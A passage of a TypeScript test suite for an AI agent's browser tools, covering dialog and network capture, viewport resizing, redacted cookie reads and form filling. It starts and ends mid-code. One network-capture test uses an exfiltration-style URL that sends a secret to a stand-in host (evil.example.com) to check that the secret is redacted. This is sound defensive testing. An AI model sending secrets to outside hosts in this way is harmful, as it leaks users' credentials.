    browserTest.setFakeSessionRefsForTest("drag-bad-from", refs);

    const raw = await browserDrag("drag-bad-from", { fromRef: "@e1", toRef: "@e2" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e1");
  });

  test("returns 'Unknown ref' when toRef is missing", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("drag-bad-to", fakePage);
    const fromLoc = { dragTo: async () => undefined };
    const refs = new Map<string, unknown>();
    refs.set("@e1", fromLoc);
    browserTest.setFakeSessionRefsForTest("drag-bad-to", refs);

    const raw = await browserDrag("drag-bad-to", { fromRef: "@e1", toRef: "@e2" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e2");
  });

  test("rejects missing arguments", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("drag-noargs", fakePage);
    const rawMissingFrom = await browserDrag("drag-noargs", { toRef: "@e2" });
    expect(JSON.parse(rawMissingFrom).error).toMatch(/fromRef/);
    const rawMissingTo = await browserDrag("drag-noargs", { fromRef: "@e1" });
    expect(JSON.parse(rawMissingTo).error).toMatch(/toRef/);
  });
});

// Dialog capture without Chromium: a fake page records the "dialog"
// listener attachDialogHandler installs, and tests fire fake Dialog
// objects through it. Surfacing rides ok()'s `dialogs` merge, exercised
// through real tool entry points (browserSnapshot / browserDialog).
describe("browser dialog capture and browser_dialog", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.resetFilledSecretsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  function makeDialogPage(url = "https://example.com/") {
    const handlers = new Map<string, (arg: unknown) => void>();
    const page = {
      ...makeFakePageForRefTools(url),
      on: (event: string, cb: (arg: unknown) => void) => {
        handlers.set(event, cb);
      }
    };
    return { page: page as unknown as import("playwright-core").Page, handlers };
  }

  function makeFakeDialog(over: Partial<{ type: string; message: string; defaultValue: string }> = {}) {
    const responses: string[] = [];
    const dialog = {
      type: () => over.type ?? "confirm",
      message: () => over.message ?? "Are you sure?",
      defaultValue: () => over.defaultValue ?? "",
      accept: async (text?: string) => {
        responses.push(`accept:${text ?? ""}`);
      },
      dismiss: async () => {
        responses.push("dismiss");
      }
    };
    return { dialog, responses };
  }

  test("an unarmed dialog is auto-dismissed, recorded, and surfaced once in the next tool result", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-task", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-task", page);
    const { dialog, responses } = makeFakeDialog({ message: "Delete this item?" });
    handlers.get("dialog")!(dialog);
    expect(responses).toEqual(["dismiss"]);

    const raw = await browserSnapshot("dlg-task", {});
    const parsed = JSON.parse(raw) as {
      success: boolean;
      dialogs?: Array<{ type: string; message: string; url: string; response: string }>;
    };
    expect(parsed.success).toBe(true);
    expect(parsed.dialogs).toHaveLength(1);
    expect(parsed.dialogs![0]!.type).toBe("confirm");
    expect(parsed.dialogs![0]!.message).toBe("Delete this item?");
    expect(parsed.dialogs![0]!.url).toBe("https://example.com/");
    expect(parsed.dialogs![0]!.response).toBe("dismissed");

    // Reported exactly once: the next result carries no dialogs field.
    const second = JSON.parse(await browserSnapshot("dlg-task", {})) as { dialogs?: unknown };
    expect(second.dialogs).toBeUndefined();
  });

  test("browser_dialog arms a one-shot accept (with promptText) consumed by the next dialog only", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-arm", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-arm", page);

    const armed = JSON.parse(await browserDialog("dlg-arm", { action: "accept", promptText: "Shelden" })) as {
      success: boolean;
      armed?: string;
      promptText?: string;
    };
    expect(armed.success).toBe(true);
    expect(armed.armed).toBe("accept");
    expect(armed.promptText).toBe("Shelden");

    const first = makeFakeDialog({ type: "prompt", message: "Your name?", defaultValue: "anon" });
    handlers.get("dialog")!(first.dialog);
    expect(first.responses).toEqual(["accept:Shelden"]);

    // One-shot: a second dialog falls back to the default dismiss.
    const second = makeFakeDialog({ message: "Leave page?" });
    handlers.get("dialog")!(second.dialog);
    expect(second.responses).toEqual(["dismiss"]);

    const raw = JSON.parse(await browserSnapshot("dlg-arm", {})) as {
      dialogs?: Array<{ type: string; response: string; promptText?: string; defaultValue?: string }>;
    };
    expect(raw.dialogs).toHaveLength(2);
    expect(raw.dialogs![0]!.response).toBe("accepted");
    expect(raw.dialogs![0]!.promptText).toBe("Shelden");
    expect(raw.dialogs![0]!.defaultValue).toBe("anon");
    expect(raw.dialogs![1]!.response).toBe("dismissed");
  });

  test("browser_dialog rejects an unknown action", async () => {
    const { page } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-bad", page as Partial<import("playwright-core").Page>);
    const parsed = JSON.parse(await browserDialog("dlg-bad", { action: "retry" })) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("accept, dismiss");
  });

  test("the unreported buffer is capped at the most recent 5 dialogs", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-cap", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-cap", page);
    for (let i = 1; i <= 7; i++) {
      handlers.get("dialog")!(makeFakeDialog({ message: `dialog ${i}` }).dialog);
    }
    const records = browserTest.peekUnreportedDialogsForTest("dlg-cap");
    expect(records).toHaveLength(5);
    expect(records[0]!.message).toBe("dialog 3");
    expect(records[4]!.message).toBe("dialog 7");
  });

  test("an adopted page resolves dialogs against the task that owns it now, not the hooking task", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-owner-a", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-owner-a", page);
    // The page survives task A and is adopted by task B: the re-attach
    // refreshes ownership without installing a second listener.
    browserTest.clearFakeSessionsForTest();
    browserTest.installFakeSessionWithPageForTest("dlg-owner-b", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-owner-b", page);

    // Task B arms an accept; the next dialog must consume B's arming even
    // though the listener was installed while task A owned the page.
    const armed = JSON.parse(await browserDialog("dlg-owner-b", { action: "accept" })) as { success: boolean };
    expect(armed.success).toBe(true);
    const { dialog, responses } = makeFakeDialog({ message: "Proceed?" });
    handlers.get("dialog")!(dialog);
    expect(responses).toEqual(["accept:"]);

    // The record lands in B's buffer, not the dead task A's.
    expect(browserTest.peekUnreportedDialogsForTest("dlg-owner-a")).toHaveLength(0);
    expect(browserTest.peekUnreportedDialogsForTest("dlg-owner-b")).toHaveLength(1);
  });

  test("browser_dialog refuses a promptText containing a registered secret and arms nothing", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-secret-arm", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-secret-arm", page);
    browserTest.recordFilledSecretForTest("dlg-secret-arm", "hunter2secret");

    const raw = await browserDialog("dlg-secret-arm", { action: "accept", promptText: "pw: hunter2secret" });
    expect(raw).not.toContain("hunter2secret");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("registered secret");

    // Nothing was armed: the next dialog takes the default dismiss path
    // and never receives the prompt text.
    const { dialog, responses } = makeFakeDialog({ type: "prompt", message: "Password?" });
    handlers.get("dialog")!(dialog);
    expect(responses).toEqual(["dismiss"]);
  });

  test("a registered secret inside the dialog message is redacted in the surfaced record", async () => {
    const { page, handlers } = makeDialogPage();
    browserTest.installFakeSessionWithPageForTest("dlg-redact", page as Partial<import("playwright-core").Page>);
    browserTest.attachDialogHandlerForTest("dlg-redact", page);
    browserTest.recordFilledSecretForTest("dlg-redact", "hunter2secret");
    handlers.get("dialog")!(makeFakeDialog({ message: "Submit hunter2secret to continue?" }).dialog);

    // Surface through browser_dialog's own ok() result — same envelope
    // every browser tool uses, so the deep-redaction pass applies.
    const raw = await browserDialog("dlg-redact", { action: "dismiss" });
    expect(raw).not.toContain("hunter2secret");
    const parsed = JSON.parse(raw) as { dialogs?: Array<{ message: string }> };
    expect(parsed.dialogs).toHaveLength(1);
    expect(parsed.dialogs![0]!.message).toBe("Submit [redacted] to continue?");
  });
});

// Network capture without Chromium: a fake page records the "response" /
// "requestfailed" listeners attachNetworkCapture installs, and tests fire
// fake event objects through them, then read the buffer via the
// browser_requests tool itself.
describe("browser network capture and browser_requests", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.resetFilledSecretsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  function makeNetworkPage(url = "https://example.com/") {
    const handlers = new Map<string, (arg: unknown) => void>();
    const page = {
      ...makeFakePageForRefTools(url),
      on: (event: string, cb: (arg: unknown) => void) => {
        handlers.set(event, cb);
      }
    };
    return { page: page as unknown as import("playwright-core").Page, handlers };
  }

  function fakeResponse(url: string, status = 200, method = "GET", resourceType = "fetch") {
    return {
      url: () => url,
      status: () => status,
      request: () => ({ method: () => method, resourceType: () => resourceType })
    };
  }

  function fakeFailedRequest(url: string, errorText: string, method = "GET", resourceType = "fetch") {
    return {
      url: () => url,
      method: () => method,
      resourceType: () => resourceType,
      failure: () => ({ errorText })
    };
  }

  test("records responses and failures in order and returns them via browser_requests", async () => {
    const { page, handlers } = makeNetworkPage();
    browserTest.installFakeSessionWithPageForTest("net-task", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-task", page);
    handlers.get("response")!(fakeResponse("https://api.example.com/items", 200, "GET", "fetch"));
    handlers.get("response")!(fakeResponse("https://api.example.com/save", 500, "POST", "xhr"));
    handlers.get("requestfailed")!(fakeFailedRequest("https://cdn.example.com/app.js", "net::ERR_CONNECTION_REFUSED", "GET", "script"));

    const raw = await browserRequests("net-task", {});
    const parsed = JSON.parse(raw) as {
      success: boolean;
      requests?: Array<{ method: string; url: string; status: number | null; resourceType: string; failure?: string }>;
    };
    expect(parsed.success).toBe(true);
    expect(parsed.requests).toHaveLength(3);
    expect(parsed.requests![0]).toEqual({ method: "GET", url: "https://api.example.com/items", status: 200, resourceType: "fetch" });
    expect(parsed.requests![1]).toEqual({ method: "POST", url: "https://api.example.com/save", status: 500, resourceType: "xhr" });
    expect(parsed.requests![2]).toEqual({
      method: "GET",
      url: "https://cdn.example.com/app.js",
      status: null,
      resourceType: "script",
      failure: "net::ERR_CONNECTION_REFUSED"
    });
  });

  test("the ring buffer keeps only the most recent 100 entries", async () => {
    const { page, handlers } = makeNetworkPage();
    browserTest.installFakeSessionWithPageForTest("net-cap", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-cap", page);
    for (let i = 1; i <= 105; i++) {
      handlers.get("response")!(fakeResponse(`https://example.com/r/${i}`));
    }
    const parsed = JSON.parse(await browserRequests("net-cap", {})) as { requests?: Array<{ url: string }> };
    expect(parsed.requests).toHaveLength(100);
    expect(parsed.requests![0]!.url).toBe("https://example.com/r/6");
    expect(parsed.requests![99]!.url).toBe("https://example.com/r/105");
  });

  test("filter narrows by URL substring", async () => {
    const { page, handlers } = makeNetworkPage();
    browserTest.installFakeSessionWithPageForTest("net-filter", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-filter", page);
    handlers.get("response")!(fakeResponse("https://api.example.com/items"));
    handlers.get("response")!(fakeResponse("https://cdn.example.com/app.js"));

    const parsed = JSON.parse(await browserRequests("net-filter", { filter: "api." })) as { requests?: Array<{ url: string }> };
    expect(parsed.requests).toHaveLength(1);
    expect(parsed.requests![0]!.url).toBe("https://api.example.com/items");
  });

  test("an adopted page logs requests against the task that owns it now, not the hooking task", async () => {
    const { page, handlers } = makeNetworkPage();
    browserTest.installFakeSessionWithPageForTest("net-owner-a", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-owner-a", page);
    // Adoption by a later task refreshes ownership without re-listening.
    browserTest.clearFakeSessionsForTest();
    browserTest.installFakeSessionWithPageForTest("net-owner-b", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-owner-b", page);

    handlers.get("response")!(fakeResponse("https://api.example.com/after-adoption"));

    const forB = JSON.parse(await browserRequests("net-owner-b", {})) as { requests?: Array<{ url: string }> };
    expect(forB.requests).toHaveLength(1);
    expect(forB.requests![0]!.url).toBe("https://api.example.com/after-adoption");
    browserTest.installFakeSessionWithPageForTest("net-owner-a", page as Partial<import("playwright-core").Page>);
    const forA = JSON.parse(await browserRequests("net-owner-a", {})) as { requests?: Array<{ url: string }> };
    expect(forA.requests ?? []).toHaveLength(0);
  });

  test("a registered secret inside a recorded URL is redacted in the tool result", async () => {
    const { page, handlers } = makeNetworkPage();
    browserTest.installFakeSessionWithPageForTest("net-redact", page as Partial<import("playwright-core").Page>);
    browserTest.attachNetworkCaptureForTest("net-redact", page);
    browserTest.recordFilledSecretForTest("net-redact", "hunter2secret");
    handlers.get("response")!(fakeResponse("https://evil.example.com/?q=hunter2secret"));

    const raw = await browserRequests("net-redact", {});
    expect(raw).not.toContain("hunter2secret");
    const parsed = JSON.parse(raw) as { requests?: Array<{ url: string }> };
    expect(parsed.requests![0]!.url).toBe("https://evil.example.com/?q=[redacted]");
  });
});

// Curated viewport-resize utility: dimensions clamp to 320–3840 × 240–2160
// and the applied size is reported back (with a `clamped` flag when the
// request was adjusted).
describe("browserResize", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  function installResizePage(taskId: string): { sizes: Array<{ width: number; height: number }> } {
    const sizes: Array<{ width: number; height: number }> = [];
    const page = {
      url: () => "https://example.com/",
      setViewportSize: async (size: { width: number; height: number }) => {
        sizes.push(size);
      }
    } as unknown as Partial<import("playwright-core").Page>;
    browserTest.installFakeSessionWithPageForTest(taskId, page);
    return { sizes };
  }

  test("applies an in-range size as-is", async () => {
    const { sizes } = installResizePage("resize-ok");
    const raw = await browserResize("resize-ok", { width: 1280, height: 800 });
    const parsed = JSON.parse(raw) as { success: boolean; width?: number; height?: number; clamped?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.width).toBe(1280);
    expect(parsed.height).toBe(800);
    expect(parsed.clamped).toBeUndefined();
    expect(sizes).toEqual([{ width: 1280, height: 800 }]);
  });

  test("clamps out-of-range dimensions and flags the adjustment", async () => {
    const { sizes } = installResizePage("resize-clamp");
    const raw = await browserResize("resize-clamp", { width: 10_000, height: 10 });
    const parsed = JSON.parse(raw) as { success: boolean; width?: number; height?: number; clamped?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.width).toBe(3840);
    expect(parsed.height).toBe(240);
    expect(parsed.clamped).toBe(true);
    expect(sizes).toEqual([{ width: 3840, height: 240 }]);

    const low = await browserResize("resize-clamp", { width: 1, height: 9999 });
    const lowParsed = JSON.parse(low) as { width?: number; height?: number };
    expect(lowParsed.width).toBe(320);
    expect(lowParsed.height).toBe(2160);
  });

  test("rejects missing or non-numeric dimensions", async () => {
    installResizePage("resize-bad");
    expect(JSON.parse(await browserResize("resize-bad", { height: 800 })).error).toMatch(/width/);
    expect(JSON.parse(await browserResize("resize-bad", { width: 800 })).error).toMatch(/height/);
    expect(JSON.parse(await browserResize("resize-bad", { width: "wide", height: 800 })).error).toMatch(/width/);
  });
});

// Curated cookie READ: values are ALWAYS replaced with "[redacted]" —
// only name/domain/path/expiry/flags reach the model. No write surface.
describe("browserCookies", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  const sessionCookie = {
    name: "session_id",
    value: "supersecretsessiontoken",
    domain: ".example.com",
    path: "/",
    expires: 1893456000,
    httpOnly: true,
    secure: true,
    sameSite: "Lax" as const
  };

  test("returns cookie metadata with values redacted, scoped to the current page URL", async () => {
    const cookieCalls: Array<string | undefined> = [];
    const page = { url: () => "https://example.com/account" } as unknown as Partial<import("playwright-core").Page>;
    const context = {
      cookies: async (url?: string) => {
        cookieCalls.push(url);
        return [sessionCookie];
      }
    } as unknown as Partial<import("playwright-core").BrowserContext>;
    browserTest.installFakeSessionWithPageAndContextForTest("cookies-page", page, context);

    const raw = await browserCookies("cookies-page", {});
    expect(raw).not.toContain("supersecretsessiontoken");
    const parsed = JSON.parse(raw) as {
      success: boolean;
      scope?: string;
      cookies?: Array<{ name: string; value: string; domain: string; httpOnly: boolean; secure: boolean; sameSite: string }>;
    };
    expect(parsed.success).toBe(true);
    expect(parsed.scope).toBe("page");
    expect(cookieCalls).toEqual(["https://example.com/account"]);
    expect(parsed.cookies).toHaveLength(1);
    expect(parsed.cookies![0]!.value).toBe("[redacted]");
    expect(parsed.cookies![0]!.name).toBe("session_id");
    expect(parsed.cookies![0]!.domain).toBe(".example.com");
    expect(parsed.cookies![0]!.httpOnly).toBe(true);
    expect(parsed.cookies![0]!.secure).toBe(true);
    expect(parsed.cookies![0]!.sameSite).toBe("Lax");
  });

  test("falls back to whole-context cookies when no http(s) page is open", async () => {
    const cookieCalls: Array<string | undefined> = [];
    const page = { url: () => "about:blank" } as unknown as Partial<import("playwright-core").Page>;
    const context = {
      cookies: async (url?: string) => {
        cookieCalls.push(url);
        return [sessionCookie];
      }
    } as unknown as Partial<import("playwright-core").BrowserContext>;
    browserTest.installFakeSessionWithPageAndContextForTest("cookies-blank", page, context);

    const raw = await browserCookies("cookies-blank", {});
    const parsed = JSON.parse(raw) as { success: boolean; scope?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.scope).toBe("context");
    expect(cookieCalls).toEqual([undefined]);
    expect(raw).not.toContain("supersecretsessiontoken");
  });

  test("fails cleanly when the session context has no cookie surface", async () => {
    const page = { url: () => "https://example.com/" } as unknown as Partial<import("playwright-core").Page>;
    browserTest.installFakeSessionWithPageForTest("cookies-none", page);
    const parsed = JSON.parse(await browserCookies("cookies-none", {})) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/not supported/);
  });

  test("refuses to read cookies while the page sits on a disallowed origin", async () => {
    const cookieCalls: Array<string | undefined> = [];
    const page = { url: () => "http://127.0.0.1:7338/admin" } as unknown as Partial<import("playwright-core").Page>;
    const context = {
      cookies: async (url?: string) => {
        cookieCalls.push(url);
        return [sessionCookie];
      }
    } as unknown as Partial<import("playwright-core").BrowserContext>;
    browserTest.installFakeSessionWithPageAndContextForTest("cookies-blocked", page, context);

    const raw = await browserCookies("cookies-blocked", {});
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("refusing to read cookies");
    // The cookie surface was never consulted.
    expect(cookieCalls).toEqual([]);
    expect(raw).not.toContain("supersecretsessiontoken");
  });
});

describe("browserFillForm", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.resetFilledSecretsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  function makeFillLocator(log: Array<{ ref: string; text: string }>, ref: string, failWith?: string) {
    return {
      fill: async (text: string, _opts?: { timeout?: number }) => {
        if (failWith) throw new Error(failWith);
        log.push({ ref, text });
      }
    };
  }

  test("fills every field in order and returns one post-action snapshot", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("fill-form", fakePage);
    const fills: Array<{ ref: string; text: string }> = [];
    const refs = new Map<string, unknown>();
    refs.set("@e1", makeFillLocator(fills, "@e1"));
    refs.set("@e2", makeFillLocator(fills, "@e2"));
    browserTest.setFakeSessionRefsForTest("fill-form", refs);

    const raw = await browserFillForm("fill-form", {
      fields: [
        { ref: "@e1", text: "Shelden" },
        { ref: "@e2", text: "Seattle" }
      ]
    });
    const parsed = JSON.parse(raw) as { success: boolean; filled?: string[]; snapshot?: string; snapshotMode?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.filled).toEqual(["@e1", "@e2"]);
    expect(fills).toEqual([
      { ref: "@e1", text: "Shelden" },
      { ref: "@e2", text: "Seattle" }
    ]);
    // One snapshot for the whole batch, same shape browser_type returns.
    expect(parsed.snapshotMode === "full" || parsed.snapshotMode === "diff").toBe(true);
    expect(typeof parsed.snapshot).toBe("string");
  });

  test("stops at the first unknown ref and reports filled vs not attempted", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("fill-stop", fakePage);
    const fills: Array<{ ref: string; text: string }> = [];
    const refs = new Map<string, unknown>();
    refs.set("@e1", makeFillLocator(fills, "@e1"));
    refs.set("@e3", makeFillLocator(fills, "@e3"));
    browserTest.setFakeSessionRefsForTest("fill-stop", refs);

    const raw = await browserFillForm("fill-stop", {
      fields: [
        { ref: "@e1", text: "a" },
        { ref: "@e2", text: "b" },
        { ref: "@e3", text: "c" }
      ]
    });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e2");
    expect(parsed.error).toContain("Filled before failure: @e1");
    expect(parsed.error).toContain("Not attempted: @e3");
    // Fields after the failure were never filled.
    expect(fills).toEqual([{ ref: "@e1", text: "a" }]);
  });

  test("stops when a fill throws and reports the failing field", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("fill-throw", fakePage);
    const fills: Array<{ ref: string; text: string }> = [];
    const refs = new Map<string, unknown>();
    refs.set("@e1", makeFillLocator(fills, "@e1", "element is not an <input>"));
    refs.set("@e2", makeFillLocator(fills, "@e2"));
    browserTest.setFakeSessionRefsForTest("fill-throw", refs);

    const raw = await browserFillForm("fill-throw", {
      fields: [
        { ref: "@e1", text: "a" },
        { ref: "@e2", text: "b" }
      ]
    });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Fill failed at @e1");
    expect(parsed.error).toContain("element is not an <input>");
    expect(parsed.error).toContain("Filled before failure: none");
    expect(parsed.error).toContain("Not attempted: @e2");
    expect(fills).toEqual([]);
  });

  test("rejects a field value containing a registered secret without echoing it", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("fill-secret", fakePage);
    const fills: Array<{ ref: string; text: string }> = [];
    const refs = new Map<string, unknown>();
    refs.set("@e1", makeFillLocator(fills, "@e1"));
    refs.set("@e2", makeFillLocator(fills, "@e2"));
    browserTest.setFakeSessionRefsForTest("fill-secret", refs);
    browserTest.recordFilledSecretForTest("fill-secret", "hunter2secret");

    const raw = await browserFillForm("fill-secret", {
      fields: [
        { ref: "@e1", text: "ordinary" },
        { ref: "@e2", text: "prefix hunter2secret suffix" }
      ]
    });
    expect(raw).not.toContain("hunter2secret");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("registered secret");
    expect(parsed.error).toContain("browser_fill_secrets");
    // Fails closed before ANY field is filled.
    expect(fills).toEqual([]);
  });

  test("rejects malformed fields arguments", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("fill-args", fakePage);
    expect(JSON.parse(await browserFillForm("fill-args", {})).error).toMatch(/fields/);
    expect(JSON.parse(await browserFillForm("fill-args", { fields: [] })).error).toMatch(/fields/);
    expect(JSON.parse(await browserFillForm("fill-args", { fields: [{ ref: "@e1" }] })).error).toMatch(/text/);
    expect(JSON.parse(await browserFillForm("fill-args", { fields: [{ text: "x" }] })).error).toMatch(/ref/);
  });
});

describe("browserSelectOption", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("forwards single value to locator.selectOption", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-single", fakePage);
    let captured: { selection: unknown; timeout?: number } | undefined;
    const loc = {
      selectOption: async (selection: unknown, opts?: { timeout?: number }) => {
        captured = { selection, timeout: opts?.timeout };
        return [];
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e3", loc);
    browserTest.setFakeSessionRefsForTest("sel-single", refs);

    const raw = await browserSelectOption("sel-single", { ref: "@e3", value: "medium" });
    const parsed = JSON.parse(raw) as { success: boolean; selected?: unknown };
    expect(parsed.success).toBe(true);
    expect(parsed.selected).toBe("medium");
    expect(captured).toBeDefined();
    expect(captured!.selection).toBe("medium");
    expect(captured!.timeout).toBe(10_000);
  });

  test("forwards values[] to locator.selectOption for multi-select", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-multi", fakePage);
    let captured: { selection: unknown } | undefined;
    const loc = {
      selectOption: async (selection: unknown) => {
        captured = { selection };
        return [];
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e3", loc);
    browserTest.setFakeSessionRefsForTest("sel-multi", refs);

    const raw = await browserSelectOption("sel-multi", { ref: "@e3", values: ["a", "b"] });
    const parsed = JSON.parse(raw) as { success: boolean; selected?: unknown };
    expect(parsed.success).toBe(true);
    expect(parsed.selected).toEqual(["a", "b"]);
    expect(captured!.selection).toEqual(["a", "b"]);
  });

  test("rejects when neither value nor values is supplied", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-neither", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { selectOption: async () => [] });
    browserTest.setFakeSessionRefsForTest("sel-neither", refs);

    const raw = await browserSelectOption("sel-neither", { ref: "@e3" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/value/i);
  });

  test("rejects when both value and values are supplied", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-both", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { selectOption: async () => [] });
    browserTest.setFakeSessionRefsForTest("sel-both", refs);

    const raw = await browserSelectOption("sel-both", { ref: "@e3", value: "a", values: ["b"] });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/either.*'value'.*or.*'values'/i);
  });

  test("rejects when values is not an array of strings", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-bad-values", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e3", { selectOption: async () => [] });
    browserTest.setFakeSessionRefsForTest("sel-bad-values", refs);

    // Non-array
    const rawNotArray = await browserSelectOption("sel-bad-values", { ref: "@e3", values: "not-an-array" });
    expect(JSON.parse(rawNotArray).error).toMatch(/array of strings/i);

    // Array with a non-string element
    const rawMixed = await browserSelectOption("sel-bad-values", { ref: "@e3", values: ["a", 1] });
    expect(JSON.parse(rawMixed).error).toMatch(/array of strings/i);
  });

  test("returns 'Unknown ref' when the ref isn't in the latest snapshot", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-bad-ref", fakePage);
    const raw = await browserSelectOption("sel-bad-ref", { ref: "@e99", value: "x" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e99");
  });

  test("rejects missing ref argument", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-no-ref", fakePage);
    const raw = await browserSelectOption("sel-no-ref", { value: "x" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/ref/);
  });
});

describe("browserWaitFor", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("ref-mode forwards { state, timeout } to locator.waitFor", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-ref", fakePage);
    let captured: { state?: string; timeout?: number } | undefined;
    const loc = {
      waitFor: async (opts: { state?: string; timeout?: number }) => {
        captured = { state: opts.state, timeout: opts.timeout };
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e3", loc);
    browserTest.setFakeSessionRefsForTest("wait-ref", refs);

    const raw = await browserWaitFor("wait-ref", { ref: "@e3", state: "hidden", timeoutMs: 2500 });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    expect(captured).toBeDefined();
    expect(captured!.state).toBe("hidden");
    expect(captured!.timeout).toBe(2500);
  });

  test("ref-mode defaults state to 'visible' and timeout to 10000", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-defaults", fakePage);
    let captured: { state?: string; timeout?: number } | undefined;
    const loc = {
      waitFor: async (opts: { state?: string; timeout?: number }) => {
        captured = { state: opts.state, timeout: opts.timeout };
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e1", loc);
    browserTest.setFakeSessionRefsForTest("wait-defaults", refs);

    await browserWaitFor("wait-defaults", { ref: "@e1" });
    expect(captured!.state).toBe("visible");
    expect(captured!.timeout).toBe(10_000);
  });

  test("text-mode calls page.waitForFunction with the needle and timeout", async () => {
    let captured: { needle?: string; timeout?: number } | undefined;
    const fakePage = {
      url: () => "https://example.com/",
      title: () => Promise.resolve("Example"),
      evaluate: (async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 })) as unknown as import("playwright-core").Page["evaluate"],
      waitForFunction: (async (
        _fn: unknown,
        arg: unknown,
        opts?: { timeout?: number }
      ): Promise<undefined> => {
